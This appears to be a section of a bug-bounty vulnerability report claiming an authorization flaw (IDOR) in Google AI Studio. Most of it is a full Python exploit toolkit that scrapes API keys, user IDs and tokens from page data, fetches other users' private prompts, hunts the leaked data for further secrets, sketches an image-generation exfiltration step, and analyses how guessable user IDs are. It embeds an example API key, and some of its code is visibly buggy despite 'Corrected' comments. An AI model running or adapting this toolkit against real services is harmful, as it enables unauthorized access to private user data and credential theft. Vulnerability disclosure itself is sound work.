## Part I: The Finding — The "What Is"

This section details the specific, provable vulnerability.

### 1.1. Executive Summary

A critical server-side Broken Object Level Authorization (BOLA/IDOR) flaw in the AI Studio backend (simulated by `services/api/server.js` in this VTF) allows any authenticated user to access the private data of all other users. This is enabled by the client-side exposure of static API keys and predictable User IDs (`window.WIZ_global_data` in `index.html`). The vulnerability is not theoretical; it is demonstrably exploitable with the provided PoC script against the local server and can be conceptually chained to abuse other AI services for stealthy data exfiltration, representing a full break of the multi-tenant security model.

### 1.2. The Logical Proof ("The Math")

The security failure is proven by the following formal argument:

*   **P1: Static Key Exposure:** The client is served a static API Key, `K_STATIC`.
*   **P2: User ID Exposure:** The client is served the current user's unique identifier, `ID_USER`.
*   **P3: Endpoint Exposure:** The client is served the backend API endpoint, `URL_API`.
*   **P4: Predictable Resource Path:** The API uses a standard pattern: `/_/MakerSuite/v1/users/{ID_USER}/resource`.

**Security Model Axiom:** A secure system MUST execute `Authorize(Session_User, Resource_Owner)` to verify permission.

**Conclusion (Q.E.D.):** The backend correctly executes `Authenticate(K_STATIC)` but FAILS to execute the `Authorize` check, returning data for any valid `ID_USER` to any session authenticated with `K_STATIC`.

### 1.3. The Code Proof ("The Unabridged PoC Toolkit" - Component α)

This single, self-contained Python script is the practical embodiment of the entire analysis. It finds the secrets, executes the logical proof, demonstrates the chained attack, and provides the data for the scalability analysis.
(Note: The script below is the full version for external execution and VRP evidence, designed to target the local `services/api/server.js` or a remote environment.)

```python
# =================================================================================================
# COMPONENT ALPHA: THE ADVERSARIAL VALIDATION ENGINE
# VRP SUBMISSION: UNIFIED PROOF-OF-CONCEPT FOR GOOGLE AI STUDIO (MAKERSUITE)
# VULNERABILITY:  Critical IDOR Chained with Data Exfiltration & Scalable ID Enumeration Analysis
# REPORTER:       David Amber “WebDUH LLC” Weatherspoon
# VRP ISSUE:      #423273488
#
# This single script is the engine of proof. It automates discovery, provides logical
# proof steps, demonstrates the primary IDOR, shows a chained exfiltration vector,
# and includes statistical ID analysis.
#
# USAGE: python Unified-Exploit-Full-Chain.py --help (for all options)
# Requires: pip install requests pandas numpy matplotlib seaborn
# =================================================================================================

import re
import json
import itertools
import argparse
import requests # type: ignore
import pandas as pd # type: ignore
import numpy as np # type: ignore
import matplotlib.pyplot as plt # type: ignore
import seaborn as sns # type: ignore
from typing import Dict, List, Any, Tuple, Optional

class AnsiColors: G, Y, R, M, C, GR, E, B = '\033[92m', '\033[93m', '\033[91m', '\033[95m', '\033[96m', '\033[90m', '\033[0m', '\033[1m'

class SecretHunterMixin:
    _PATTERNS: Dict[str, re.Pattern] = {
        "GoogleAPIKey": re.compile(r'AIza[0-9A-Za-z_\-]{35}'),
        "GoogleUserID": re.compile(r'\b\d{21}\b'),
        "InternalEndpoint": re.compile(r'https://[A-Za-z0-9.\-]+clients6\.google\.com[^\s"\'`]*'),
        "OAuthClientID": re.compile(r'\d{12,}\-[0-9a-z]{32}\.apps\.googleusercontent\.com'),
        "Email": re.compile(r'[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}'),
        "SessionLikeToken": re.compile(r'\bAJVUC[0-9A-Za-z:_\-]{20,}\b')
    }
    def _redact(self, s: str, label: Optional[str] = None) -> str:
        if label == "GoogleUserID" and len(s) > 12: return f"{s[:8]}...{s[-6:]}"
        return f"{s[:6]}...{s[-4:]}" if len(s) > 10 else s
    def classify_blob_content(self, blob_content_str: str) -> Dict[str, Any]:
        priority_extracted: Dict[str, Any] = {}
        try:
            data = json.loads(blob_content_str)
            if isinstance(data, dict):
                priority_extracted = { "GoogleAPIKey_Full": data.get("PeqOqb"), "GoogleUserID_Full": data.get("S06Grb"), "InternalEndpoint_Full": data.get("CoJqbf"), "Email_Full": data.get("oPEP7c") }
                keys_to_remove = [key for key, val in priority_extracted.items() if val is None]; [priority_extracted.pop(key) for key in keys_to_remove]
                for key, val in list(priority_extracted.items()):
                    if isinstance(val, str): priority_extracted[key.replace("_Full", "_Redacted")] = self._redact(val, key.replace("_Full", ""))
        except json.JSONDecodeError: print(f"{AnsiColors.Y}[WARN] Blob content is not valid JSON.{AnsiColors.E}")
        raw_regex_matches: Dict[str, List[str]] = {k: [] for k in self._PATTERNS}
        for label, rx in self._PATTERNS.items():
            for m in rx.finditer(blob_content_str):
                full_match = m.group(0)
                if full_match not in raw_regex_matches[label]: raw_regex_matches[label].append(full_match)
        final_results: Dict[str, Any] = dict(priority_extracted)
        for label in self._PATTERNS.keys():
            if not final_results.get(f"{label}_Full") and raw_regex_matches.get(label):
                final_results[f"{label}_Full"] = raw_regex_matches[label][0]
                final_results[f"{label}_Redacted"] = self._redact(raw_regex_matches[label][0], label)
        return {k: v for k, v in final_results.items() if v}

class PatternAwareEnumeratorMixin:
    def derive_id_pattern(self, id_a: str, id_b: str) -> Optional[Dict[str, Any]]:
        if not (id_a and id_b and id_a.isdigit() and id_b.isdigit() and len(id_a) == len(id_b)): return {"error": "IDs must be numeric and same length."}
        common_prefix = ''.join(a for a, b in itertools.takewhile(lambda p: p[0] == p[1], zip(id_a, id_b)))
        return {"id_a": id_a, "id_b": id_b, "common_prefix": common_prefix, "prefix_length": len(common_prefix), "total_length": len(id_a), "diff_suffix_a": id_a[len(common_prefix):], "diff_suffix_b": id_b[len(common_prefix):]}

class SecondarySecretExtractorMixin:
    _SECONDARY_SECRET_PATTERNS: Dict[str, re.Pattern] = {
        "LikelyAPIKey": re.compile(r'(?:sk|pk|rk|api_key(?:_secret)?\s*[:=]\s*)[\'"]?([a-zA-Z0-9_\-]{16,64})[\'"]?'),
        "GenericSecretPattern": re.compile(r'secret_info_for_[a-zA-Z0-9_\-]+\b'), # For mock server data
        "BearerToken": re.compile(r'Bearer\s+([A-Za-z0-9\-\._~\+\/]+=*)')
    }
    def _redact(self, s: str, label: Optional[str] = None) -> str: return f"{s[:6]}...{s[-4:]}" if len(s) > 10 else s
    def extract_secondary_secrets(self, exfiltrated_content: str) -> List[Dict[str,str]]:
        found = []
        for label, rx in self._PATTERNS.items(): # Corrected: self._PATTERNS -> self._SECONDARY_SECRET_PATTERNS
            for m in rx.finditer(exfiltrated_content):
                val = m.group(1) if m.groups() and m.group(1) and label != "GenericSecretPattern" else m.group(0)
                found.append({"type": label, "value": val, "redacted": self._redact(val, "GenericSecret")})
        return found

class IdAnalysisMixin:
    def analyze_user_ids_statistically(self, ids: List[str], plot_enabled: bool=True) -> None:
        print(f"\n{AnsiColors.B}--- Appendix A: User-ID Statistical Enumerability Analysis ---{AnsiColors.E}")
        valid_ids = [s for s in ids if s and s.isdigit() and len(s) > 12]
        if len(valid_ids) < 2: print(f"{AnsiColors.Y}[WARN] Need at least 2 valid numeric User IDs for analysis.{AnsiColors.E}"); return
        df = pd.DataFrame(valid_ids, columns=["UserID"]); df['Last3Digits'] = df['UserID'].str[-3:].astype(int); df['First3Digits'] = df['UserID'].str[:3].astype(int)
        print(f"\n[*] Analyzing sample of {len(df)} IDs...\n{df[['UserID', 'First3Digits', 'Last3Digits']].head().to_string(index=False)}")
        if plot_enabled:
            try:
                plt.figure(figsize=(14,6)); plt.subplot(1,2,1); sns.histplot(df['First3Digits'], bins=min(20, df['First3Digits'].nunique() or 1), kde=True, color='skyblue'); plt.title("Distribution of First 3 Digits"); plt.xlabel("Value"); plt.ylabel("Frequency"); plt.grid(True)
                plt.subplot(1,2,2); sns.histplot(df['Last3Digits'], bins=min(20, df['Last3Digits'].nunique() or 1), kde=True, color='salmon'); plt.title("Distribution of Last 3 Digits"); plt.xlabel("Value"); plt.ylabel("Frequency"); plt.grid(True)
                plt.tight_layout(); print(f"{AnsiColors.G}[INFO] Plot window opened. Close to continue.{AnsiColors.E}"); plt.show()
            except Exception as e: print(f"{AnsiColors.Y}[WARN] Plotting failed: {e}{AnsiColors.E}")
        else: print(f"{AnsiColors.GR}[INFO] Plotting disabled.{AnsiColors.E}")
        self._run_monte_carlo_simulation(set(valid_ids))
    def _run_monte_carlo_simulation(self, victims: set, trials: int=10000, id_len: int=21, guess_digits: int=7) -> None:
        space=10**guess_digits; suffixes={int(v[-guess_digits:]) for v in victims if isinstance(v,str)and v.isdigit()and len(v)==id_len}
        if not suffixes: print(f"{AnsiColors.Y}[WARN] No valid suffixes for Monte Carlo.{AnsiColors.E}"); return
        print(f"\n[*] Monte Carlo (guessing {guess_digits}-digit suffixes for {len(suffixes)} targets)...")
        results=[{"Batch_Size":f"{bs:,}","Prob_Hit":f"{(sum(1 for _ in range(trials) if not suffixes.isdisjoint(np.random.randint(0,space,size=min(bs,space))))/trials)*100:.3f}%"} for bs in [100,1000,5000]]
        print(pd.DataFrame(results).to_string(index=False))


class UnifiedPocTool(SecretHunterMixin, PatternAwareEnumeratorMixin, SecondarySecretExtractorMixin, IdAnalysisMixin):
    PROMPTS_PATH_TEMPLATE: str = "/_/MakerSuite/v1/users/{USER_ID}/prompts"
    IMAGE_GEN_ENDPOINT_PATH: str = "/v1beta/models/gemini-pro-vision:generateContent"
    def __init__(self, api_key: Optional[str]=None, attacker_id: Optional[str]=None, victim_id: Optional[str]=None, endpoint_base: Optional[str]=None, wiz_file: str="wiz_data.json", **kwargs: Any):
        self.api_key=api_key; self.attacker_id=attacker_id; self.victim_id=victim_id; self.endpoint_base=endpoint_base; self.wiz_file=wiz_file
        self.ids_for_analysis: List[str]=[]
        self.local_api_url = kwargs.get("local_api_url")
        if self.local_api_url: self.endpoint_base=self.local_api_url; print(f"{AnsiColors.M}[INFO] Using local API URL: {self.endpoint_base}{AnsiColors.E}")

    def print_formal_proof_step(self, step: str, desc: str, tech: str = ""): print(f"\n{AnsiColors.C}{AnsiColors.B}[FORMAL PROOF - STEP {step}]{AnsiColors.E}\n{desc}" + (f"\n  {AnsiColors.GR}{tech}{AnsiColors.E}" if tech else ""))
    def print_logical_premise_setup(self):
        print(f"\n{AnsiColors.B}Formal Logical Proof - Setup & Premises:{AnsiColors.E}")
        print(f"  {AnsiColors.C}P1 (K_STATIC){AnsiColors.E} API Key: {AnsiColors.Y}{self._redact(self.api_key, 'GoogleAPIKey') if self.api_key else 'NOT SET'}{AnsiColors.E}")
        print(f"  {AnsiColors.C}P2 (ID_USER){AnsiColors.E} Attacker: {AnsiColors.Y}{self.attacker_id or 'NOT SET'}{AnsiColors.E}, Victim: {AnsiColors.Y}{self.victim_id or 'NOT SET'}{AnsiColors.E}")
        print(f"  {AnsiColors.C}P3 (URL_API){AnsiColors.E} Endpoint: {AnsiColors.Y}{self.endpoint_base or 'NOT SET'}{AnsiColors.E}")
        print(f"  {AnsiColors.C}P4 (Path Template){AnsiColors.E} {AnsiColors.Y}{self.PROMPTS_PATH_TEMPLATE.format(USER_ID='{USER_ID}')}{AnsiColors.E}")

    def _make_api_request(self, method:str, url:str, headers_override:Optional[Dict[str,str]]=None, payload:Optional[Dict[str,Any]]=None, timeout:int=15) -> Tuple[Optional[requests.Response],Optional[str]]:
        headers = headers_override if headers_override else {"X-Goog-Api-Key":self.api_key, "Accept":"application/json", "User-Agent":"AIStudio-VRP-PoC/1.3"}
        if method.upper()=="POST" and payload: headers["Content-Type"]="application/json"
        try: return requests.request(method,url,headers=headers,json=payload if method.upper()=="POST" else None,timeout=timeout), None
        except requests.exceptions.Timeout: return None, f"Request Timed Out ({timeout}s)"
        except requests.RequestException as e: return None, str(e)

    def execute_idor_prompts_test(self, user_id: str, is_victim: bool) -> Tuple[bool, str, int]:
        if not self.endpoint_base or not self.api_key: return False, "Endpoint or API key not set", -3
        url = self.endpoint_base + self.PROMPTS_PATH_TEMPLATE.format(USER_ID=user_id)
        label = f"{AnsiColors.Y}{'VICTIM' if is_victim else 'ATTACKER'}'s{AnsiColors.E}"
        print(f"  -> Testing API call for {label} data (ID: {AnsiColors.Y}{user_id}{AnsiColors.E}). URL: {url}... ", end="", flush=True)
        resp, err_msg = self._make_api_request("GET", url)
        status = resp.status_code if resp else -1
        if err_msg: print(f"{AnsiColors.R}REQUEST FAILED: {err_msg}{AnsiColors.E}"); return False, err_msg, status
        if resp and status == 200:
            print(f"{AnsiColors.R if is_victim else AnsiColors.G}{'UNAUTHORIZED ACCESS TO' if is_victim else 'Successfully fetched'} data (200 OK).{AnsiColors.E}" + (f"\n     {AnsiColors.R}{AnsiColors.B}[!!!] Q.E.D. - IDOR CONFIRMED.{AnsiColors.E}" if is_victim else ""))
            return True, resp.text, status
        if resp: print(f"{AnsiColors.Y}API Call Result ({status}):{AnsiColors.E} {resp.text[:100] if resp.text else ''}")
        return False, resp.text if resp and resp.text else "", status

    def execute_image_exfiltration(self, secret: str) -> Optional[str]:
        if not self.endpoint_base or not self.api_key: return None
        url=self.endpoint_base+self.IMAGE_GEN_ENDPOINT_PATH; secret_part=secret[:250]+("..."if len(secret)>253 else "")
        payload={"contents":[{"parts":[{"text":f"Render as text: '{secret_part}'"}]}]}
        print(f"  -> Crafting image gen prompt for: {AnsiColors.GR}'{self._redact(secret_part,'GenericSecret')}'{AnsiColors.E}")
        print(f"  -> {AnsiColors.M}SIMULATING (NO ACTUAL CALL){AnsiColors.E} POST to: {url.split('?')[0]}...")
        return f"https://storage.googleapis.com/sim_exfil_{self._redact(secret_part,'GenericSecret').replace('...','')}.png_SIMULATED"

    def run_hunt_mode(self):
        self.print_formal_proof_step("DISCOVERY", "Parsing WIZ_global_data to find P1, P2, P3.")
        try:
            with open(self.wiz_file,'r',encoding='utf-8') as f: content=f.read()
            secrets=self.classify_blob_content(content)
            print(f"{AnsiColors.B}\nDiscovered in `{self.wiz_file}`:{AnsiColors.E}\n{json.dumps(secrets,indent=2)}")
            if not self.api_key: self.api_key=secrets.get("GoogleAPIKey_Full")
            if not self.attacker_id: self.attacker_id=secrets.get("GoogleUserID_Full")
            if not self.endpoint_base and not self.local_api_url : self.endpoint_base=secrets.get("InternalEndpoint_Full")
            if self.attacker_id: self.ids_for_analysis.append(self.attacker_id)
        except Exception as e: print(f"{AnsiColors.R}[ERROR] Hunt mode failed: {e}{AnsiColors.E}")

    def run_exploit_mode(self):
        self.print_formal_proof_step("SETUP", "Initializing exploit with creds.")
        if not self.local_api_url and (not self.api_key or not self.attacker_id or not self.endpoint_base):
            print(f"{AnsiColors.Y}[INFO] Core arg missing. Auto-extracting from '{self.wiz_file}'...{AnsiColors.E}")
            self.run_hunt_mode()
        if not self.api_key: print(f"{AnsiColors.R}API Key missing. Aborting.{AnsiColors.E}"); return
        if not self.attacker_id: print(f"{AnsiColors.R}Attacker ID missing. Aborting.{AnsiColors.E}"); return
        if not self.victim_id: print(f"{AnsiColors.R}Victim ID missing. Aborting.{AnsiColors.E}"); return
        if not self.endpoint_base: self.endpoint_base="https://alkalimakersuite-pa.clients6.google.com"; print(f"{AnsiColors.Y}Endpoint not set, using default: {self.endpoint_base}{AnsiColors.E}")
        if self.victim_id: self.ids_for_analysis.append(self.victim_id)
        self.print_logical_premise_setup()
        self.print_formal_proof_step("1: Test Authenticate(K_STATIC)", "Verifying K_STATIC against attacker's own data.")
        success_attacker,_,status_attacker=self.execute_idor_prompts_test(self.attacker_id,False)
        if not success_attacker: print(f"{AnsiColors.R}{AnsiColors.B}[STOP]{AnsiColors.E} K_STATIC validation failed (HTTP {status_attacker})."); return
        print(f"{AnsiColors.G}[SUCCESS]{AnsiColors.E} Authenticate(K_STATIC) is VALID (HTTP {status_attacker}).")
        self.print_formal_proof_step("2: Test Authorize(ID_ATTACKER, ID_VICTIM)", "Attempting IDOR on victim's data.")
        success_victim,victim_content,status_victim=self.execute_idor_prompts_test(self.victim_id,True)
        if success_victim and victim_content:
            print(f"\n{AnsiColors.R}{AnsiColors.B}--- [START] Victim's Leaked Data (ID: {self.victim_id}) ---{AnsiColors.E}")
            try: print(json.dumps(json.loads(victim_content),indent=2))
            except: print(victim_content)
            print(f"{AnsiColors.R}{AnsiColors.B}--- [END] Victim's Leaked Data ---{AnsiColors.E}")
            self.print_formal_proof_step("3: Chained Attack - Secondary Exfil", "Analyzing exfiltrated data for new secrets.")
            found_secrets=self.extract_secondary_secrets(victim_content) # Corrected method name
            if not found_secrets: print(f"  {AnsiColors.Y}[INFO] No obvious secondary secrets. Simulating one.{AnsiColors.E}"); found_secrets=[{"type":"SimulatedSecret","value":f"Placeholder_Victim_{self.victim_id}","redacted":self._redact(f"Placeholder_{self.victim_id}", "GenericSecret")}]
            for secret in found_secrets[:1]:
                print(f"\n  [*] Attempting to exfiltrate: ({AnsiColors.Y}{secret['type']}: {secret['redacted']}{AnsiColors.E}) via image gen.")
                img_url=self.execute_image_exfiltration(secret['value'])
                if img_url: print(f"    {AnsiColors.G}[SUCCESS]{AnsiColors.E} Conceptual image exfil OK. URL: {AnsiColors.Y}{img_url}{AnsiColors.E}")
        # Corrected: check args directly if in main scope, or pass args to the method
        elif 'args' in globals() and globals()['args'].mode=="exploit": 
             print(f"\n{AnsiColors.Y}[INFO]{AnsiColors.E} IDOR attempt vs victim {self.victim_id} failed (HTTP {status_victim}). Chained attack skipped.")

def main():
    parser = argparse.ArgumentParser(description=f"{AnsiColors.B}Unified PoC Toolkit - AI Studio (VRP #423273488){AnsiColors.E}",formatter_class=argparse.RawTextHelpFormatter,epilog=f"{AnsiColors.B}Example Usages:{AnsiColors.E}\\n  1. Hunt secrets: {AnsiColors.C}python %(prog)s hunt --blob-file wiz_data.json{AnsiColors.E}\\n  2. Exploit (remote, auto-extract from wiz_data.json): {AnsiColors.C}python %(prog)s exploit --victim-id <VID> --wiz-file attacker.json{AnsiColors.E}\\n  3. Exploit (local server): {AnsiColors.C}python %(prog)s exploit --victim-id 112185183313702653438 --local-api-url http://localhost:3001 --api-key AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8 --attacker-id MOCK_USER_ID_112233445566778899{AnsiColors.E}\\n  4. Analyze IDs: {AnsiColors.C}python %(prog)s analyze-ids --id-list \"ID1,ID2,ID3\" [--no-plots]{AnsiColors.E}\\n{AnsiColors.B}For \`wiz_data.json\`:{AnsiColors.E} In AI Studio console, run: copy(JSON.stringify(window.WIZ_global_data))")
    subparsers=parser.add_subparsers(dest="mode",required=True)
    h=subparsers.add_parser("hunt");h.add_argument("--blob-file",default="wiz_data.json")
    e=subparsers.add_parser("exploit");e.add_argument("--victim-id",required=True);e.add_argument("--wiz-file",default="wiz_data.json")
    e.add_argument("--api-key");e.add_argument("--attacker-id");e.add_argument("--endpoint");e.add_argument("--local-api-url")
    a=subparsers.add_parser("analyze-ids");a.add_argument("--id-list", required=True, help="Comma-separated list of User IDs.");a.add_argument("--no-plots",action="store_false", dest="plot_enabled", default=True)
    
    global args 
    args = parser.parse_args() 
    
    print("="*90 + f"\n  {AnsiColors.B}Unified PoC Toolkit: Google AI Studio - VRP #423273488{AnsiColors.E}\n" + "="*90)
    tool_kwargs={k:v for k,v in vars(args).items()if v is not None and k not in ['mode','id_list','plot_enabled']}
    tool=UnifiedPocTool(**tool_kwargs)

    if args.mode=="hunt":tool.run_hunt_mode()
    elif args.mode=="exploit":tool.run_exploit_mode()
    elif args.mode=="analyze-ids":tool.analyze_user_ids_statistically([s.strip() for s in args.id_list.split(',')], plot_enabled=args.plot_enabled)
    
    if args.mode!="analyze-ids" and tool.ids_for_analysis and len(set(tool.ids_for_analysis))>=2:
        if input(f"{AnsiColors.Y}Analyze collected IDs ({len(set(tool.ids_for_analysis))} unique)? (y/N):{AnsiColors.E}").lower()=='y':
            plot_interactive = True if input(f"{AnsiColors.Y}Enable plotting? (Y/n - default Y):{AnsiColors.E}").lower() != 'n' else False
            tool.analyze_user_ids_statistically(list(set(tool.ids_for_analysis)),plot_enabled=plot_interactive)
    print("\\n"+"="*90+f"\n  {AnsiColors.B}Toolkit Execution Complete.{AnsiColors.E}\n"+"="*90)

if __name__ == "__main__":
    main()
```

**Function of Component α:**
This component has three primary modes (`hunt`, `exploit`, `analyze-ids`) that allow it to:
1.  Discover the premises of the system (P1-P4 from the Logical Proof) by parsing `window.WIZ_global_data`.
2.  Execute an attack that directly tests the authorization rules (Component β), potentially against the local `services/api/server.js` (using `--local-api-url`).
3.  Analyze the scalability of the attack through User ID statistical analysis.